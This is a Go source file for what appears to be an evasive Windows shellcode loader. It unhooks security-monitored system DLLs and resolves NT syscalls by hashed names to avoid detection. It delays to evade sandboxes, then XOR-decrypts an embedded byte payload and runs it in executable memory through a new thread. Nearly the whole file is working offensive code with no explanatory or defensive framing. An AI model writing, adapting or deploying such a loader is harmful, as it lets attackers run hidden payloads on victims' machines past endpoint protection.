package main

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

func eoka(input []byte, sulfur []byte) []byte {
	result := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		result[i] = input[i] ^ sulfur[i%len(sulfur)]
	}
	return result
}

var input = []byte{0xa8, 0x3a, 0xfa, 0xd5, 0xbf, 0x9d, 0xb8, 0x54, 0x72, 0x79, 0x70, 0x1e, 0x34, 0x24, 0x06, 0x23, 0x2f, 0x79, 0x7e, 0xa7, 0x11, 0x1c, 0xf9, 0x2b, 0x51, 0x07, 0xfe, 0x26, 0x4c, 0x3a, 0xf2, 0x63, 0x6f, 0x38, 0x45, 0x9d, 0x3a, 0x76, 0x86, 0x05, 0x3f, 0x3c, 0xdf, 0x00, 0x29, 0x79, 0x7e, 0xb5, 0xd8, 0x68, 0x13, 0x05, 0x33, 0x63, 0x55, 0x35, 0x95, 0xbb, 0x74, 0x70, 0x4e, 0xb4, 0x96, 0xb9, 0x20, 0x38, 0x60, 0x07, 0xfe, 0x26, 0x74, 0xf9, 0x3b, 0x0d, 0x07, 0x74, 0xa4, 0x32, 0xf3, 0x01, 0x29, 0x44, 0x77, 0x7b, 0xd1, 0x00, 0x79, 0x31, 0x4f, 0xfe, 0xf4, 0xdc, 0x72, 0x79, 0x31, 0x07, 0xf0, 0xb4, 0x20, 0x15, 0x31, 0x30, 0x9f, 0xfe, 0x3c, 0x4c, 0x36, 0xf2, 0x71, 0x6f, 0x3c, 0x75, 0x84, 0x22, 0x9a, 0x67, 0x07, 0x8a, 0xbd, 0x19, 0x43, 0xb0, 0x70, 0xc4, 0x41, 0xfc, 0x1c, 0x73, 0xaf, 0x79, 0x7e, 0xb5, 0x35, 0x95, 0xbb, 0x74, 0x9d, 0x0e, 0x74, 0xb5, 0x6c, 0x92, 0x0c, 0xc0, 0x03, 0x76, 0x38, 0x70, 0x7a, 0x3c, 0x08, 0x9e, 0x00, 0xac, 0x0c, 0x36, 0xf2, 0x71, 0x6b, 0x3c, 0x75, 0x84, 0x14, 0x38, 0xba, 0x43, 0x3d, 0x30, 0xdf, 0x32, 0x65, 0x78, 0x4e, 0xa5, 0x35, 0xdf, 0x76, 0xf1, 0x70, 0x17, 0x34, 0x2c, 0x0a, 0x3a, 0x78, 0xe1, 0x16, 0x2f, 0x35, 0x0c, 0x33, 0x20, 0x70, 0x15, 0x3d, 0xf7, 0xb8, 0x52, 0x38, 0x63, 0xb0, 0x95, 0x2c, 0x15, 0x2b, 0x23, 0x79, 0xc4, 0x67, 0x9d, 0x1f, 0x8d, 0x86, 0xce, 0x12, 0x3c, 0xca, 0x23, 0x01, 0x4b, 0x6e, 0x7c, 0x47, 0x74, 0x54, 0x33, 0x2f, 0x78, 0xc6, 0x93, 0x3c, 0xd5, 0x9e, 0xd9, 0x30, 0x4f, 0x75, 0x3d, 0xdd, 0x97, 0x30, 0x8d, 0x4d, 0x75, 0x6b, 0xc0, 0xde, 0x69, 0x46, 0x28, 0x34, 0x20, 0x1d, 0xfb, 0x9d, 0x7d, 0xc6, 0x84, 0x35, 0xee, 0x3e, 0x0e, 0x17, 0x48, 0x8a, 0xa1, 0x18, 0xfb, 0x93, 0x59, 0x4e, 0x74, 0x74, 0x54, 0x2b, 0x38, 0x8b, 0x66, 0xf5, 0x1f, 0x54, 0x8d, 0xac, 0x5b, 0x45, 0x34, 0x2a, 0x04, 0x22, 0x34, 0x00, 0x86, 0x38, 0x45, 0x94, 0x3a, 0x86, 0xf1, 0x07, 0xfc, 0xb6, 0x1c, 0x8d, 0xb9, 0x79, 0xc6, 0xb4, 0x35, 0xee, 0x98, 0x76, 0xee, 0xaf, 0x8a, 0xa1, 0x1c, 0xfb, 0xbe, 0x5b, 0x5f, 0x34, 0x2c, 0x18, 0xfb, 0x9b, 0x79, 0xc6, 0x8c, 0x35, 0xee, 0xeb, 0xdc, 0x45, 0x2e, 0x8a, 0xa1, 0xd1, 0xb2, 0x0d, 0x3b, 0x06, 0x8a, 0xba, 0x21, 0x97, 0x91, 0xa2, 0x4f, 0x75, 0x74, 0x1c, 0xf1, 0x95, 0x21, 0x07, 0xfc, 0x96, 0x19, 0x43, 0xb0, 0x5b, 0x4b, 0x34, 0x2c, 0x1c, 0xfb, 0x80, 0x70, 0xf5, 0x77, 0xad, 0x9c, 0x2d, 0x86, 0xe4, 0xcc, 0x8d, 0x74, 0x2a, 0x27, 0x31, 0xb2, 0x8b, 0x55, 0x2a, 0xdd, 0x84, 0x13, 0x71, 0x0e, 0x2c, 0x1c, 0x54, 0x62, 0x79, 0x31, 0x0e, 0x2d, 0x3c, 0xdd, 0x80, 0x31, 0x00, 0x86, 0x34, 0xce, 0x0c, 0xd6, 0x2a, 0xd4, 0xb0, 0xa0, 0x3c, 0xdd, 0xb1, 0x30, 0xb8, 0x88, 0x38, 0x45, 0x9d, 0x3b, 0xf0, 0xc1, 0x07, 0xfc, 0xae, 0x1c, 0xfb, 0x80, 0x70, 0xf5, 0x77, 0xad, 0x9c, 0x2d, 0x86, 0xe4, 0xcc, 0x8d, 0x74, 0x29, 0x5a, 0x21, 0x70, 0x18, 0x2c, 0x1c, 0x54, 0x32, 0x79, 0x31, 0x0e, 0x2d, 0x1e, 0x54, 0x28, 0x38, 0x8b, 0x44, 0x5a, 0x7b, 0x64, 0x8d, 0xac, 0x66, 0x16, 0x34, 0xce, 0x21, 0x1c, 0x34, 0x50, 0xb0, 0xa0, 0x3d, 0xab, 0xbc, 0x90, 0x0d, 0xb0, 0x8a, 0x8b, 0x1c, 0x73, 0xba, 0x79, 0x66, 0xb3, 0x3c, 0xd1, 0x84, 0x0c, 0x85, 0x0e, 0x8a, 0x93, 0x0c, 0x18, 0x79, 0x68, 0x06, 0xb2, 0xb6, 0xa4, 0xc7, 0xdb, 0x67, 0xb0, 0xa0}

func main() {
	var thisThread = uintptr(0xffffffffffffffff)
	fmt.Println("Rust Main Raider")
	homes := []string{string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
	}
	e := gabh.CMDUnhook(homes)
	if e == nil {
		fmt.Println(":)")
	}
	alloc, e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	team, e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	death, e := gabh.MemHgate(Sha256Hex("NtDelayExecution"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject, _, e := gabh.DiskFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
	if e != nil {
		panic(e)
	}
	times := -(3000 * 100000)
	gabh.HgSyscall(death, uintptr(0), uintptr(unsafe.Pointer(&times))) //NtDelayExecution
	fmt.Println("Satchel Throw:)")
	raid(input, thisThread, alloc, protect, team, pWaitForSingleObject)
}

func raid(cookie []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	var cookies = eoka(cookie, []byte("Try1Out"))
	var baseA uintptr
	regionsize := uintptr(len(cookies))
	r1, r := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	memcpy(baseA, cookies)

	var oldprotect uintptr
	r1, r = gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
